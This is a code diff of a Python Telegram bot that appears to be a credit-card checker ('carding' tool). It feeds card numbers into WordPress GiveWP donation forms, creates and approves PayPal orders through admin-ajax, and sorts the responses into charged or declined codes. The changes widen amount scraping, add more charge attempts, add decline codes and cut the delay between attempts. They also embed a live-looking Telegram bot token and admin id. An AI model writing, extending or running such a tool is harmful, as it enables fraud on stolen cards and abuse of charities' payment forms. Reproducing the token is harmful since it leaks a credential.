@@ -25,12 +25,14 @@ except:
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+                'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
             ]
         @property
         def random(self):
             return random.choice(self.agents)
 
-token = '8689698569:AAEKe4aG2sNS0yDiGg0OVFD2TfCHSLwLlDc'
+token = '8407490230:AAEWWQvi_64s0BK5kGXn2XqU2DmYFqVx3lU'
 bot = telebot.TeleBot(token, parse_mode="HTML")
 admin = 6843321125
 myid = ['6843321125']
@@ -131,6 +133,7 @@ class PayPalLinkTester:
         self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
         self.donation = "1.00"
         self.minimum_amount = "1.00"
+        self.current_price_id = None
         self.r = requests.Session()
         self.r.verify = False
         if HAS_FAKE_UA:
@@ -152,6 +155,7 @@ class PayPalLinkTester:
         self.js_checked = 0
         self.js_sources = []
         self.price_levels = []
+        self.last_attempts = []
 
     def Charge(self, ccx):
         try:
@@ -177,7 +181,6 @@ class PayPalLinkTester:
             expiry = f"20{yy}-{mm}"
 
             self._give_process_donation()
-
             order_id = self._create_order_smart()
             if not order_id:
                 return "Create Order Failed"
@@ -257,6 +260,9 @@ class PayPalLinkTester:
             self._extract_all_tokens(html)
             self._extract_minimum_amount(html)
             self._extract_price_levels(html)
+            m = re.search(r'name="give-price-id"\s+value="([^"]*)"', html)
+            if m and m.group(1).strip():
+                self.current_price_id = m.group(1).strip()
             self._extract_from_js(html)
         except:
             pass
@@ -269,17 +275,38 @@ class PayPalLinkTester:
         for m in re.finditer(r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', html):
             try: levels.append((m.group(2), float(m.group(1))))
             except: pass
+        for m in re.finditer(r'data-price=["\']([\d.]+)["\']', html):
+            try: levels.append(('custom', float(m.group(1))))
+            except: pass
         for m in re.finditer(r'<input[^>]*type="radio"[^>]*value=["\']([\d.]+)["\'][^>]*data-price-id=["\']([^"\']+)["\']', html):
             try: levels.append((m.group(2), float(m.group(1))))
             except: pass
         for m in re.finditer(r'<input[^>]*type="radio"[^>]*data-price-id=["\']([^"\']+)["\'][^>]*value=["\']([\d.]+)["\']', html):
             try: levels.append((m.group(1), float(m.group(2))))
             except: pass
-        for m in re.finditer(r'data-price=["\']([\d.]+)["\']', html):
+        for m in re.finditer(r'<button[^>]*>([^<]*\$[\d.,]+[^<]*)</button>', html):
+            try:
+                amt_match = re.search(r'\$([\d.,]+)', m.group(1))
+                if amt_match:
+                    amt = float(amt_match.group(1).replace(',', ''))
+                    levels.append(('custom', amt))
+            except: pass
+        for m in re.finditer(r'data-amount=["\']([\d.]+)["\']', html):
             try: levels.append(('custom', float(m.group(1))))
             except: pass
-        for m in re.finditer(r'<button[^>]*>\s*\$([\d.]+)\s*</button>', html):
+        for m in re.finditer(r'<option[^>]*value=["\']([\d.]+)["\']', html):
             try: levels.append(('custom', float(m.group(1))))
+            except: pass
+        for m in re.finditer(r'data-price-id=["\']([^"\']+)["\'][^>]*>[^<]*\$([\d.,]+)', html):
+            try:
+                amt = float(m.group(2).replace(',', ''))
+                levels.append((m.group(1), amt))
+            except: pass
+        for m in re.finditer(r'<input[^>]*name="give-amount"[^>]*value=["\']([\d.]+)["\']', html):
+            try: levels.append(('custom', float(m.group(1))))
+            except: pass
+        for m in re.finditer(r'"price_id"\s*:\s*"?(\d+)"?[^}]*?"amount"\s*:\s*"?([\d.]+)"?', html):
+            try: levels.append((m.group(1), float(m.group(2))))
             except: pass
         seen = set()
         unique = []
@@ -298,8 +325,14 @@ class PayPalLinkTester:
                 try:
                     float(m.group(1))
                     self.minimum_amount = m.group(1)
+                    return
                 except:
                     pass
+            mins = re.findall(r'<input[^>]*min=["\']([\d.]+)["\'][^>]*>', html, re.IGNORECASE)
+            if mins:
+                valid = [x for x in mins if x.replace('.', '').isdigit()]
+                if valid:
+                    self.minimum_amount = str(min(float(v) for v in valid))
         except:
             pass
 
@@ -309,7 +342,7 @@ class PayPalLinkTester:
             priority = [u for u in js_urls if any(k in u.lower() for k in ['paypal', 'give', 'donation', 'ppcp', 'commerce', 'checkout'])]
             others = [u for u in js_urls if u not in priority]
             ordered = priority + others
-            for js_url in ordered[:8]:
+            for js_url in ordered[:10]:
                 try:
                     if js_url.startswith('//'): js_url = 'https:' + js_url
                     elif js_url.startswith('/'): js_url = f'https://{self.url}{js_url}'
@@ -529,25 +562,37 @@ class PayPalLinkTester:
         attempts = []
         for pid, amt in self.price_levels:
             attempts.append((pid, amt))
+        if self.current_price_id:
+            for amt in [1.0, 2.0, 3.0, 5.0, 10.0, 15.0, 20.0, 25.0, 50.0, 100.0]:
+                attempts.append((self.current_price_id, amt))
+        for amt in [1.0, 2.0, 3.0, 5.0, 10.0]:
+            attempts.append(('', amt))
+        for amt in [1.0, 2.0, 3.0, 5.0]:
+            attempts.append(('custom', amt))
+        for amt in [1.0, 5.0, 10.0]:
+            attempts.append(('3', amt))
         if self.minimum_amount and self.minimum_amount != "1.00":
-            try: attempts.append(('custom', float(self.minimum_amount)))
+            try:
+                for pid in [self.current_price_id, 'custom', '', '3']:
+                    if pid is not None:
+                        attempts.append((str(pid), float(self.minimum_amount)))
             except: pass
-        attempts.extend([('custom', 1.0), ('custom', 2.0), ('custom', 3.0), ('custom', 5.0), ('custom', 10.0)])
         seen = set()
         unique = []
         for pid, amt in attempts:
-            key = (pid, float(amt))
+            key = (str(pid), float(amt))
             if key not in seen:
                 seen.add(key)
-                unique.append((pid, float(amt)))
+                unique.append((str(pid), float(amt)))
         unique.sort(key=lambda x: x[1])
         for pid, amt in unique:
             amount_str = f"{amt:.2f}"
             self.donation = amount_str
             order_id = self._create_order_givewp_with_price(pid, amount_str)
+            self.last_attempts.append({'pid': pid, 'amount': amount_str, 'result': 'ok' if order_id else 'fail'})
             if order_id:
                 return order_id
-            time.sleep(0.5)
+            time.sleep(0.3)
         if self.access_token:
             return self._create_order_direct()
         if self.client_token:
@@ -786,6 +831,7 @@ def ali_al2(massege):
 💬 <b>Response:</b> <code>{result}</code>
 💰 <b>Amount:</b> <code>${amount_display}</code>
 🔍 <b>JS Scanned:</b> <code>{paypal.js_checked}</code>
+🎯 <b>Levels:</b> <code>{len(paypal.price_levels)}</code>
 ━━━━━━━━━━━━━━━━━━━━
 Dev: @FAWZY30''')
         os.remove(file_name)
@@ -940,7 +986,7 @@ Dev: @FAWZY30"""
 
 
 def generate_gateway_code(result, link, paypal_obj=None, result_dict=None):
-    id_form1 = ''; id_form2 = ''; nonec = ''; au = ''; client_id = ''; amount = '1.00'
+    id_form1 = ''; id_form2 = ''; nonec = ''; au = ''; client_id = ''; amount = '5.00'
     if paypal_obj:
         id_form1 = paypal_obj.form_data.get('give-form-id-prefix', '')
         id_form2 = paypal_obj.form_data.get('give-form-id', '')
@@ -1024,19 +1070,34 @@ class PayPal:
             r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params={{'action': 'give_paypal_commerce_approve_order', 'order': order_id}}, headers=he5, data=da4, timeout=15)
 
             text = r5.text
-            if 'true' in text: return 'CHARGE 1.00$'
-            elif 'INSUFFICIENT_FUNDS' in text: return "INSUFFICIENT_FUNDS"
-            elif 'PAYER_CANNOT_PAY' in text: return "PAYER_CANNOT_PAY"
-            elif 'ORDER_NOT_APPROVED' in text: return "Payer cannot pay for this transaction."
-            elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text: return "RESTRICTED_OR_INACTIVE_ACCOUNT"
-            elif 'GENERIC_DECLINE' in text: return "GENERIC_DECLINE"
-            elif 'DO_NOT_HONOR' in text: return "DO_NOT_HONOR"
-            elif 'CVV2_FAILURE' in text: return "CVV2_FAILURE"
-            elif 'EXPIRED_CARD' in text: return "EXPIRED_CARD"
-            elif 'SUSPECTED_FRAUD' in text: return "SUSPECTED_FRAUD"
-            else:
-                try: return str(r5.json()['data']['error'])
-                except: return "UNKNOWN_ERROR"
+            text_lower = text.lower()
+            if 'true' in text_lower and 'error' not in text_lower:
+                return 'CHARGE 1.00$'
+            codes_check = [
+                ('INSUFFICIENT_FUNDS', 'INSUFFICIENT_FUNDS'),
+                ('PAYER_CANNOT_PAY', 'PAYER_CANNOT_PAY'),
+                ('ORDER_NOT_APPROVED', 'Payer cannot pay for this transaction.'),
+                ('RESTRICTED_OR_INACTIVE_ACCOUNT', 'RESTRICTED_OR_INACTIVE_ACCOUNT'),
+                ('PAYEE_BLOCKED_TRANSACTION', 'PAYEE_BLOCKED_TRANSACTION'),
+                ('GENERIC_DECLINE', 'GENERIC_DECLINE'),
+                ('DO_NOT_HONOR', 'DO_NOT_HONOR'),
+                ('CVV2_FAILURE', 'CVV2_FAILURE'),
+                ('CVV_FAILURE', 'CVV_FAILURE'),
+                ('EXPIRED_CARD', 'EXPIRED_CARD'),
+                ('SUSPECTED_FRAUD', 'SUSPECTED_FRAUD'),
+                ('ACCOUNT_CLOSED', 'ACCOUNT_CLOSED'),
+                ('LOST_OR_STOLEN', 'LOST_OR_STOLEN'),
+                ('TRANSACTION_REFUSED', 'TRANSACTION_REFUSED'),
+            ]
+            for keyword, label in codes_check:
+                if keyword.lower() in text_lower:
+                    return label
+            if 'declined' in text_lower:
+                return "DECLINED"
+            try:
+                return str(r5.json()['data']['error'])
+            except:
+                return "DECLINED"
         except Exception as e:
             return f"Error: {{e}}"
 
